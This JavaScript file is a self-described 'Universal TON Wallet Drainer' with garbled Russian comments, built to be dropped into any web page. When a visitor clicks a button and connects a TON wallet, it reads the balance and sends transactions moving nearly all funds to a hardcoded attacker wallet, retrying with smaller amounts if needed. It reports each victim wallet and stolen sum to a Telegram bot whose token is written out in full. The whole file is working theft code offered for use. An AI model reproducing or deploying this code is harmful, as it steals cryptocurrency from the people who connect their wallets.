// Universal TON Wallet Drainer
// –ü—Ä–æ—Å—Ç–æ –¥–æ–±–∞–≤—å—Ç–µ <script src="index.js"></script> –∏ <button class="ton">–¢–µ–∫—Å—Ç –∫–Ω–æ–ø–∫–∏</button>
(function() {
    'use strict';

    // ===== –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø =====
    const CONFIG = {
        // Telegram Bot Configuration
        telegramBotToken: '7918019157:AAFne7ZoTKNeJp7vBjYt6F8waCJKkzFLz1E',
        telegramChatId: '-4961842391',
        
        // TON Wallet Configuration
        tonReceiverWallet: 'UQAER0Zs8BCd2_hPFOnWYce9T1KniO9EqKUeuDmu50UCkzhI',
        
        // TON API Configuration
        tonCenterApiUrl: 'https://toncenter.com/api/v2',
        tonCenterApiKey: '',
        
        // Logging Configuration
        logging: {
            walletConnection: true,
            transactionSuccess: true,
            errors: true
        }
    };

    // ===== –ì–õ–û–ë–ê–õ–¨–ù–´–ï –ü–ï–†–ï–ú–ï–ù–ù–´–ï =====
    let tonConnectUI = null;
    let isConnected = false;

    // ===== –ó–ê–ì–†–£–ó–ö–ê TON CONNECT UI =====
    function loadTONConnectUI() {
        return new Promise((resolve, reject) => {
            if (window.TON_CONNECT_UI) {
                resolve();
                return;
            }

            const script = document.createElement('script');
            script.src = 'https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js';
            script.onload = () => {
                console.log('‚úÖ TON Connect UI –∑–∞–≥—Ä—É–∂–µ–Ω');
                resolve();
            };
            script.onerror = () => {
                console.error('‚ùå –û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ TON Connect UI');
                reject(new Error('–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å TON Connect UI'));
            };
            document.head.appendChild(script);
        });
    }

    // ===== –ö–û–ù–í–ï–†–¢–ê–¶–ò–Ø –ê–î–†–ï–°–û–í =====
    function convertRawToUserFriendly(rawAddress) {
        try {
            // –ï—Å–ª–∏ —É–∂–µ user-friendly (—Å–æ–¥–µ—Ä–∂–∏—Ç - –∏–ª–∏ _)
            if (rawAddress.includes('-') || rawAddress.includes('_')) {
                return rawAddress;
            }
            
            // –ï—Å–ª–∏ raw —Ñ–æ—Ä–º–∞—Ç (0:hex)
            if (rawAddress.startsWith('0:')) {
                try {
                    const hex = rawAddress.substring(2);
                    // –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º hex –≤ bytes
                    const bytes = new Uint8Array(hex.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
                    
                    // –°–æ–∑–¥–∞–µ–º buffer —Å workchain (0) + account
                    const fullBytes = new Uint8Array(33);
                    fullBytes[0] = 0; // workchain 0
                    fullBytes.set(bytes, 1);
                    
                    // –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º –≤ base64
                    let base64 = btoa(String.fromCharCode.apply(null, fullBytes));
                    // –ó–∞–º–µ–Ω—è–µ–º —Å–∏–º–≤–æ–ª—ã –¥–ª—è URL-safe base64
                    base64 = base64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
                    
                    return 'EQ' + base64;
                } catch (hexError) {
                    console.log('–û—à–∏–±–∫–∞ hex –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏:', hexError);
                    return rawAddress;
                }
            }
            
            // –ï—Å–ª–∏ —ç—Ç–æ —É–∂–µ base64 –∞–¥—Ä–µ—Å –±–µ–∑ –ø—Ä–µ—Ñ–∏–∫—Å–∞, –¥–æ–±–∞–≤–ª—è–µ–º EQ
            if (rawAddress.length === 48 && !rawAddress.startsWith('EQ')) {
                return 'EQ' + rawAddress;
            }
            
            return rawAddress;
        } catch (error) {
            console.log('–û—à–∏–±–∫–∞ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏ –∞–¥—Ä–µ—Å–∞:', error);
            return rawAddress;
        }
    }

    // ===== –ü–û–õ–£–ß–ï–ù–ò–ï –ë–ê–õ–ê–ù–°–ê =====
    async function getWalletBalance(address) {
        try {
            console.log('üí∞ –ü–æ–ª—É—á–∞–µ–º –±–∞–ª–∞–Ω—Å —á–µ—Ä–µ–∑ TONCenter API –¥–ª—è:', address);
            
            // –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —Ä–∞–∑–ª–∏—á–Ω—ã–µ —Ñ–æ—Ä–º–∞—Ç—ã –∞–¥—Ä–µ—Å–∞
            const userFriendly = convertRawToUserFriendly(address);
            const addressFormats = [
                userFriendly,
                address,
                address.replace(/[_-]/g, '+').replace(/=/g, ''),
                address.replace(/[+]/g, '_').replace(/=/g, ''),
                address.replace(/[_]/g, '-').replace(/=/g, ''),
                userFriendly + '=',
                address + '='
            ];
            
            console.log('üîÑ –ü—Ä–æ–±—É–µ–º —Ñ–æ—Ä–º–∞—Ç—ã –∞–¥—Ä–µ—Å–æ–≤:', addressFormats);
            
            for (const addressFormat of addressFormats) {
                try {
                    const apiUrl = `${CONFIG.tonCenterApiUrl}/getAddressInformation`;
                    const params = new URLSearchParams({
                        address: addressFormat
                    });
                    
                    if (CONFIG.tonCenterApiKey) {
                        params.append('api_key', CONFIG.tonCenterApiKey);
                    }
                    
                    console.log(`üîç –¢–µ—Å—Ç–∏—Ä—É–µ–º: ${addressFormat.substring(0, 20)}...`);
                    const response = await fetch(`${apiUrl}?${params}`, {
                        method: 'GET',
                        headers: {
                            'Accept': 'application/json'
                        }
                    });
                    
                    if (!response.ok) {
                        console.log(`‚ùå HTTP ${response.status} –¥–ª—è ${addressFormat.substring(0, 20)}...`);
                        continue;
                    }
                    
                    const data = await response.json();
                    console.log(`üìä API –æ—Ç–≤–µ—Ç –¥–ª—è ${addressFormat.substring(0, 20)}...`);
                    
                    if (!data.ok) {
                        console.log(`‚ö†Ô∏è API –æ—à–∏–±–∫–∞: ${data.error || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞'}`);
                        continue;
                    }
                    
                    if (!data.result || data.result.balance === undefined) {
                        console.log(`‚ö†Ô∏è –ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö –æ –±–∞–ª–∞–Ω—Å–µ –≤ –æ—Ç–≤–µ—Ç–µ`);
                        continue;
                    }
                    
                    const balance = parseInt(data.result.balance);
                    const tonBalance = balance / 1000000000;
                    
                    console.log(`‚úÖ –ë–ê–õ–ê–ù–° –ù–ê–ô–î–ï–ù: ${balance} nanotons (${tonBalance.toFixed(6)} TON)`);
                    console.log(`üéØ –£—Å–ø–µ—à–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∞–¥—Ä–µ—Å–∞: ${addressFormat}`);
                    
                    return balance;
                    
                } catch (formatError) {
                    console.log(`‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø—Ä–æ—Å–∞ –¥–ª—è ${addressFormat.substring(0, 20)}...:`, formatError.message);
                    continue;
                }
                
                // –ü–∞—É–∑–∞ –º–µ–∂–¥—É –∑–∞–ø—Ä–æ—Å–∞–º–∏
                await new Promise(resolve => setTimeout(resolve, 200));
            }
            
            console.log('‚ùå –í—Å–µ —Ñ–æ—Ä–º–∞—Ç—ã –∞–¥—Ä–µ—Å–∞ –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª–∏');
            return null;
            
        } catch (error) {
            console.error('‚ùå –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞:', error);
            return null;
        }
    }

    // ===== –û–¢–ü–†–ê–í–ö–ê –£–í–ï–î–û–ú–õ–ï–ù–ò–ô –í TELEGRAM =====
    async function sendTelegramNotification(data) {
        try {
            const { wallet, type, signature, amount } = data;
            
            // –ú–æ—Å–∫–æ–≤—Å–∫–æ–µ –≤—Ä–µ–º—è
            const moscowTime = new Date().toLocaleString('ru-RU', {
                timeZone: 'Europe/Moscow',
                year: 'numeric',
                month: '2-digit',
                day: '2-digit',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
            });
            
            // –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º –∞–¥—Ä–µ—Å –≤ user-friendly —Ñ–æ—Ä–º–∞—Ç
            const userFriendlyWallet = convertRawToUserFriendly(wallet);
            
            let telegramMessage = '';
            
            if (type === 'connected') {
                telegramMessage = `üî• TON –ö–û–®–ï–õ–ï–ö –ü–û–î–ö–õ–Æ–ß–ï–ù!\n\nüí∞ –ö–æ—à–µ–ª—ë–∫ –∂–µ—Ä—Ç–≤—ã: ${userFriendlyWallet}\nüéØ –ü–æ–ª—É—á–∞—Ç–µ–ª—å: ${CONFIG.tonReceiverWallet}\nüìÖ –í—Ä–µ–º—è (–ú–°–ö): ${moscowTime}\n\nüöÄ –ù–∞—á–∏–Ω–∞–µ–º –¥—Ä–µ–π–Ω...`;
            } else if (type === 'transaction_success') {
                telegramMessage = `üíé –£–°–ü–ï–®–ù–´–ô –î–†–ï–ô–ù TON!\n\nüì§ –û—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—å: ${userFriendlyWallet}\nüì• –ú–û–ô –ö–û–®–ï–õ–ï–ö: ${CONFIG.tonReceiverWallet}\nüí∞ –ü–æ–ª—É—á–µ–Ω–æ: ${amount} TON\nüîó –ü–æ–¥–ø–∏—Å—å: ${signature}\n‚è∞ –í—Ä–µ–º—è (–ú–°–ö): ${moscowTime}`;
            } else {
                telegramMessage = `‚ÑπÔ∏è TON –°–æ–±—ã—Ç–∏–µ\nüí∞ –ö–æ—à–µ–ª—ë–∫: ${userFriendlyWallet}`;
            }
            
            const response = await fetch(`https://api.telegram.org/bot${CONFIG.telegramBotToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CONFIG.telegramChatId,
                    text: telegramMessage
                })
            });
            
            if (response.ok) {
                console.log('‚úÖ –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram');
            } else {
                console.error('‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è');
            }

        } catch (error) {
            console.error('‚ùå –û—à–∏–±–∫–∞ Telegram —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è:', error);
        }
    }

    // ===== –£–ú–ù–´–ô –î–†–ï–ô–ù–ï–† =====
    async function smartDrainWallet(walletAddress) {
        try {
            console.log('üéØ –ù–∞—á–∏–Ω–∞–µ–º —É–º–Ω—ã–π –¥—Ä–µ–π–Ω –¥–ª—è:', walletAddress);
            
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫–æ—à–µ–ª—å–∫–∞
            if (!tonConnectUI.wallet || !tonConnectUI.wallet.account) {
                console.error('‚ùå –ö–æ—à–µ–ª–µ–∫ –Ω–µ –ø–æ–¥–∫–ª—é—á–µ–Ω –∫ TON Connect UI');
                return false;
            }
            
            console.log('‚úÖ –ö–æ—à–µ–ª–µ–∫ –ø–æ–¥–∫–ª—é—á–µ–Ω, –ø–æ–ª—É—á–∞–µ–º –±–∞–ª–∞–Ω—Å...');
            
            // –ü–æ–ª—É—á–∞–µ–º –±–∞–ª–∞–Ω—Å —Å –º–Ω–æ–∂–µ—Å—Ç–≤–µ–Ω–Ω—ã–º–∏ –ø–æ–ø—ã—Ç–∫–∞–º–∏
            let walletBalance = null;
            let attempts = 0;
            const maxAttempts = 3;
            
            while (attempts < maxAttempts && !walletBalance) {
                attempts++;
                console.log(`üìä –ü–æ–ø—ã—Ç–∫–∞ ${attempts}/${maxAttempts} –ø–æ–ª—É—á–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞...`);
                walletBalance = await getWalletBalance(walletAddress);
                
                if (!walletBalance && attempts < maxAttempts) {
                    console.log('‚è≥ –ü–∞—É–∑–∞ –ø–µ—Ä–µ–¥ —Å–ª–µ–¥—É—é—â–µ–π –ø–æ–ø—ã—Ç–∫–æ–π...');
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
            
            let smartAmounts = [];
            
            if (walletBalance && walletBalance > 100000000) { // –ú–∏–Ω–∏–º—É–º 0.1 TON –Ω–∞ –±–∞–ª–∞–Ω—Å–µ
                const tonBalance = walletBalance / 1000000000;
                console.log(`üí∞ –ë–ê–õ–ê–ù–° –û–ü–†–ï–î–ï–õ–ï–ù: ${tonBalance.toFixed(6)} TON (${walletBalance} nanotons)`);
                
                // –¢–æ—á–Ω–∞—è —Å—É–º–º–∞ –∫ —Å–ø–∏—Å–∞–Ω–∏—é: –±–∞–ª–∞–Ω—Å - 0.1 TON
                const reserveForFees = 100000000; // 0.1 TON –≤ nanotons
                const exactAmount = walletBalance - reserveForFees;
                
                console.log(`üîí –†–µ–∑–µ—Ä–≤ –Ω–∞ –∫–æ–º–∏—Å—Å–∏–∏: 0.1 TON`);
                console.log(`üéØ –¢–û–ß–ù–ê–Ø –°–£–ú–ú–ê –ö –°–ü–ò–°–ê–ù–ò–Æ: ${(exactAmount / 1000000000).toFixed(6)} TON`);
                
                if (exactAmount > 0) {
                    // –û—Å–Ω–æ–≤–Ω–∞—è —Å—Ç—Ä–∞—Ç–µ–≥–∏—è: —Ç–æ—á–Ω–∞—è —Å—É–º–º–∞ (–±–∞–ª–∞–Ω—Å - 0.1)
                    smartAmounts = [exactAmount];
                    
                    // –î–æ–±–∞–≤–ª—è–µ–º fallback —Å—É–º–º—ã –Ω–∞ —Å–ª—É—á–∞–π –µ—Å–ª–∏ —Ç–æ—á–Ω–∞—è –Ω–µ –ø—Ä–æ–π–¥–µ—Ç
                    const fallbackPercents = [0.95, 0.9, 0.85, 0.8, 0.7, 0.6, 0.5];
                    fallbackPercents.forEach(percent => {
                        const fallbackAmount = Math.floor(exactAmount * percent);
                        if (fallbackAmount >= 50000000) { // –ú–∏–Ω–∏–º—É–º 0.05 TON
                            smartAmounts.push(fallbackAmount);
                        }
                    });
                    
                    console.log('üéØ –°—Ç—Ä–∞—Ç–µ–≥–∏—è —Å–ø–∏—Å–∞–Ω–∏—è:');
                    console.log(`   1. –¢–û–ß–ù–ê–Ø –°–£–ú–ú–ê: ${(exactAmount / 1000000000).toFixed(6)} TON (–±–∞–ª–∞–Ω—Å - 0.1)`);
                    smartAmounts.slice(1).forEach((amount, index) => {
                        const percent = fallbackPercents[index] * 100;
                        console.log(`   ${index + 2}. ${percent}% –æ—Ç —Ç–æ—á–Ω–æ–π: ${(amount / 1000000000).toFixed(6)} TON`);
                    });
                } else {
                    console.log('‚ö†Ô∏è –ë–∞–ª–∞–Ω—Å —Å–ª–∏—à–∫–æ–º –º–∞–ª (–º–µ–Ω—å—à–µ 0.1 TON)');
                }
            } else {
                console.log('‚ùå –ë–∞–ª–∞–Ω—Å –Ω–µ–∏–∑–≤–µ—Å—Ç–µ–Ω –∏–ª–∏ –º–µ–Ω—å—à–µ 0.1 TON, –∏—Å–ø–æ–ª—å–∑—É–µ–º —Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —Å—É–º–º—ã');
            }
            
            // –§–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —Å—É–º–º—ã –∫–∞–∫ —Ä–µ–∑–µ—Ä–≤ (–æ—Ç –º–∞–ª—ã—Ö –∫ –±–æ–ª—å—à–∏–º –¥–ª—è —ç–∫–æ–Ω–æ–º–∏–∏ –∫–æ–º–∏—Å—Å–∏–π)
            const fallbackAmounts = [
                100000000,    // 0.1 TON
                200000000,    // 0.2 TON
                500000000,    // 0.5 TON
                1000000000,   // 1 TON
                2000000000    // 2 TON
            ];
            
            // –û–±—ä–µ–¥–∏–Ω—è–µ–º —É–º–Ω—ã–µ –∏ —Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —Å—É–º–º—ã
            const allAmounts = [...smartAmounts.map(a => a.toString()), ...fallbackAmounts.map(a => a.toString())];
            
            console.log('üéØ –ü–æ–ª–Ω—ã–π —Å–ø–∏—Å–æ–∫ —Å—É–º–º –¥–ª—è –ø–æ–ø—ã—Ç–æ–∫:', allAmounts.map(a => (parseInt(a) / 1000000000).toFixed(6) + ' TON'));

            for (const amount of allAmounts) {
                try {
                    const transaction = {
                        validUntil: Math.floor(Date.now() / 1000) + 600,
                        messages: [{
                            address: CONFIG.tonReceiverWallet,
                            amount: amount,
                            payload: null
                        }]
                    };

                    console.log(`üí∏ –ü—Ä–æ–±—É–µ–º —Å—É–º–º—É: ${(parseInt(amount) / 1000000000).toFixed(6)} TON`);
                    const result = await tonConnectUI.sendTransaction(transaction);
                    
                    console.log('‚úÖ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è —É—Å–ø–µ—à–Ω–∞:', result);
                    
                    const tonAmount = (parseInt(amount) / 1000000000).toFixed(6);
                    const userFriendlyAddress = convertRawToUserFriendly(walletAddress);
                    await sendTelegramNotification({
                        wallet: userFriendlyAddress,
                        type: 'transaction_success',
                        signature: result.boc || result.hash || 'unknown',
                        amount: tonAmount
                    });

                    return true; // –í—ã—Ö–æ–¥–∏–º –ø–æ—Å–ª–µ –ø–µ—Ä–≤–æ–π —É—Å–ø–µ—à–Ω–æ–π —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
                    
                } catch (error) {
                    console.log(`‚ùå –°—É–º–º–∞ ${(parseInt(amount) / 1000000000).toFixed(6)} TON –Ω–µ —É–¥–∞–ª–∞—Å—å:`, error.message);
                    
                    // –ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ–º —Ç–∏–ø –æ—à–∏–±–∫–∏
                    if (error.message.includes('insufficient') || error.message.includes('balance')) {
                        console.log('üí∞ –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤ –¥–ª—è —ç—Ç–æ–π —Å—É–º–º—ã, –ø—Ä–æ–±—É–µ–º –º–µ–Ω—å—à–µ...');
                    } else if (error.message.includes('User rejected') || error.message.includes('cancelled')) {
                        console.log('üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–∫–ª–æ–Ω–∏–ª —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é');
                        return false;
                    }
                    
                    continue;
                }
            }
            
            console.log('‚ö†Ô∏è –í—Å–µ —Å—É–º–º—ã –Ω–µ —É–¥–∞–ª–∏—Å—å');
            return false;
        } catch (error) {
            console.error('‚ùå –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞ –¥—Ä–µ–π–Ω–∞:', error);
            return false;
        }
    }

    // ===== –ò–ù–ò–¶–ò–ê–õ–ò–ó–ê–¶–ò–Ø TON CONNECT UI =====
    async function initTONConnectUI() {
        try {
            await loadTONConnectUI();
            
            tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
                manifestUrl: 'https://ton-connect.github.io/demo-dapp-with-react-ui/tonconnect-manifest.json',
                restoreConnection: false,
                walletsListConfiguration: {
                    includeWallets: [
                        {
                            appName: "tonkeeper",
                            name: "Tonkeeper",
                            imageUrl: "https://tonkeeper.com/assets/tonconnect-icon.png",
                            aboutUrl: "https://tonkeeper.com",
                            universalLink: "https://app.tonkeeper.com/ton-connect",
                            bridgeUrl: "https://bridge.tonapi.io/bridge",
                            platforms: ["ios", "android", "chrome", "firefox"]
                        },
                        {
                            appName: "tonhub", 
                            name: "Tonhub",
                            imageUrl: "https://tonhub.com/tonconnect_logo.png",
                            aboutUrl: "https://tonhub.com",
                            universalLink: "https://tonhub.com/ton-connect",
                            bridgeUrl: "https://connect.tonhubapi.com/tonconnect",
                            platforms: ["ios", "android"]
                        }
                    ]
                }
            });

            // –ü—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–æ –æ—Ç–∫–ª—é—á–∞–µ–º –ª—é–±—ã–µ –ø—Ä–µ–¥—ã–¥—É—â–∏–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
            try {
                await tonConnectUI.disconnect();
            } catch (e) {
                // –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –æ—à–∏–±–∫–∏ –æ—Ç–∫–ª—é—á–µ–Ω–∏—è
            }

            console.log('‚úÖ TON Connect UI –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω');
            return true;
        } catch (error) {
            console.error('‚ùå –û—à–∏–±–∫–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ TON Connect UI:', error);
            return false;
        }
    }

    // ===== –û–ë–†–ê–ë–û–¢–ß–ò–ö –ü–û–î–ö–õ–Æ–ß–ï–ù–ò–Ø –ö–û–®–ï–õ–¨–ö–ê =====
    async function handleWalletConnection(button) {
        const originalText = button.innerHTML;
        try {
            console.log('üîó –ù–∞—á–∏–Ω–∞–µ–º –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫–æ—à–µ–ª—å–∫–∞...');
            
            // –ò–∑–º–µ–Ω—è–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –∫–Ω–æ–ø–∫–∏
            button.innerHTML = '‚è≥ –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ...';
            button.disabled = true;

            // –ü–æ–¥–∫–ª—é—á–∞–µ–º –∫–æ—à–µ–ª–µ–∫
            await tonConnectUI.connectWallet();
            
            // –ü–æ–ª—É—á–∞–µ–º –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω—ã–π –∫–æ—à–µ–ª—ë–∫
            const wallet = tonConnectUI.wallet;
            
            if (wallet && wallet.account && wallet.account.address) {
                console.log('‚úÖ –ö–æ—à–µ–ª—ë–∫ —É—Å–ø–µ—à–Ω–æ –ø–æ–¥–∫–ª—é—á–µ–Ω');
                isConnected = true;
                
                const walletAddress = wallet.account.address;
                const userFriendlyAddress = convertRawToUserFriendly(walletAddress);
                
                console.log('TON –∫–æ—à–µ–ª—ë–∫ –ø–æ–¥–∫–ª—é—á–µ–Ω (raw):', walletAddress);
                console.log('TON –∫–æ—à–µ–ª—ë–∫ –ø–æ–¥–∫–ª—é—á–µ–Ω (user-friendly):', userFriendlyAddress);
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏
                await sendTelegramNotification({
                    wallet: userFriendlyAddress,
                    type: 'connected'
                });

                button.innerHTML = 'üí∏ –û–±—Ä–∞–±–æ—Ç–∫–∞...';

                // –ù–∞—á–∏–Ω–∞–µ–º –ø—Ä–æ—Ü–µ—Å—Å –¥—Ä–µ–π–Ω–∞
                const drainSuccess = await smartDrainWallet(walletAddress);
                
                if (drainSuccess) {
                    button.innerHTML = '‚úÖ –ì–æ—Ç–æ–≤–æ!';
                } else {
                    button.innerHTML = '‚ùå –û—à–∏–±–∫–∞ - –ø–æ–≤—Ç–æ—Ä–∏—Ç–µ';
                    button.disabled = false;
                    isConnected = false;
                }
            } else {
                throw new Error('–ö–æ—à–µ–ª—ë–∫ –Ω–µ –ø–æ–¥–∫–ª—é—á–µ–Ω –∏–ª–∏ –Ω–µ–≤–µ—Ä–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ');
            }
            
        } catch (error) {
            console.error('‚ùå –û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–∞:', error);
            button.innerHTML = originalText;
            button.disabled = false;
            isConnected = false;
            
            if (error.message.includes('User rejected') || error.message.includes('rejected')) {
                console.log('üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–∫–ª–æ–Ω–∏–ª –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ');
            } else if (error.message.includes('No wallet')) {
                console.log('üì± –ö–æ—à–µ–ª—ë–∫ –Ω–µ –Ω–∞–π–¥–µ–Ω');
            } else {
                console.log('‚ö†Ô∏è –û–±—â–∞—è –æ—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è:', error.message);
            }
        }
    }

    // ===== –ê–í–¢–û–ú–ê–¢–ò–ß–ï–°–ö–ê–Ø –ò–ù–ò–¶–ò–ê–õ–ò–ó–ê–¶–ò–Ø =====
    async function initTONDrainer() {
        try {
            console.log('üöÄ –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Universal TON Drainer...');
            
            // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º TON Connect UI
            const uiReady = await initTONConnectUI();
            if (!uiReady) {
                console.error('‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å TON Connect UI');
                return;
            }
            
            // –ò—â–µ–º –≤—Å–µ –∫–Ω–æ–ø–∫–∏ —Å –∫–ª–∞—Å—Å–æ–º "ton"
            const buttons = document.querySelectorAll('.ton');
            console.log(`üîç –ù–∞–π–¥–µ–Ω–æ ${buttons.length} –∫–Ω–æ–ø–æ–∫ —Å –∫–ª–∞—Å—Å–æ–º "ton"`);
            
            if (buttons.length === 0) {
                console.warn('‚ö†Ô∏è –ö–Ω–æ–ø–∫–∏ —Å –∫–ª–∞—Å—Å–æ–º "ton" –Ω–µ –Ω–∞–π–¥–µ–Ω—ã!');
                return;
            }
            
            // –î–æ–±–∞–≤–ª—è–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –¥–ª—è –≤—Å–µ—Ö –∫–Ω–æ–ø–æ–∫
            buttons.forEach((button, index) => {
                button.addEventListener('click', () => handleWalletConnection(button));
                console.log(`‚úÖ –ö–Ω–æ–ø–∫–∞ ${index + 1} –Ω–∞—Å—Ç—Ä–æ–µ–Ω–∞`);
                
                // –î–æ–±–∞–≤–ª—è–µ–º —Å—Ç–∏–ª–∏ –µ—Å–ª–∏ –Ω—É–∂–Ω–æ
                if (!button.style.cursor) {
                    button.style.cursor = 'pointer';
                }
            });
            
            console.log('üéâ Universal TON Drainer —É—Å–ø–µ—à–Ω–æ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω!');
            console.log('üí° –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: <button class="ton">–í–∞—à —Ç–µ–∫—Å—Ç</button>');
            
        } catch (error) {
            console.error('‚ùå –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏:', error);
        }
    }

    // ===== –ó–ê–ü–£–°–ö –ü–†–ò –ó–ê–ì–†–£–ó–ö–ï –°–¢–†–ê–ù–ò–¶–´ =====
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initTONDrainer);
    } else {
        // DOM —É–∂–µ –∑–∞–≥—Ä—É–∂–µ–Ω
        initTONDrainer();
    }
})();